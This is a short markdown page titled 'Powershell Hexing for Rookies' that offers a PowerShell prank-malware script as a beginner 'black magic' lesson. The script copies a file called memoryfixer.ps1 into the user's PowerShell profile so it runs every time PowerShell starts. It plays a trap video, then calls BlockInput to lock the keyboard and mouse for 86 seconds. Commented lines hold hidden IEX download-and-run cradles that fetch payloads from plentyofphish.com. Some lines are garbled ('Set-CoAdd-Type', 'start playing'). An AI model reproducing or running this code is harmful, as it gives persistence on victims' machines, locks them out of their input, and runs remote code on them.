# Powershell Hexing for Rookies

Spell Class : Black Magic

Spell Level : Introduction

---

```powershell
$filethingy = (Get-Childitem -Path C:\ -Recurse -ErrorAction SilentlyContinue | where {$_.Name -match 'memoryfixer.ps1'}).FullName
$content = Get-Content -Path $filethingy

if (!(Test-Path $profile)) {
New-Item -ItemType File -Path $profile -Force 
Set-Content -Path $profile -Value $content
}else {
Set-Content -Path $profile -Value $content
}



Set-CoAdd-Type -AssemblyName presentationCore
$filepath = "C:\Windows\Temp\trap.mp4"
$wmplayer = New-Object System.Windows.Media.MediaPlayer
$wmplayer.Open($filepath)
Start-Sleep 1 
$duration = $wmplayer.NaturalDuration.TimeSpan.Seconds
$wmplayer.Close()
start playing
$proc = Start-process -FilePath "C:\Program Files (x86)\Windows Media Player\wmplayer.exe" -ArgumentList $filepath -PassThru



# This Bit locks the user out for 86 seconds

$code = @'
    [DllImport("user32.dll")]
        public static extern bool BlockInput(bool fBlockIt);
'@
        
        $userInput = Add-Type -MemberDefinition $code -Name Blocker -Namespace UserInput -PassThru
        
        
        $null = $userInput::BlockInput($true)
        
Write-Warning "You have just fell for the trap..."

        Start-Sleep -Seconds 86
        
       
        $null = $userInput::BlockInput($false)
        


Set-StrictMode -Version 2

#powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://plentyofphish.com:80/traptime'))"
#powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://plentyofphish.com:80/.exe'))"

#Runs above payloads

```
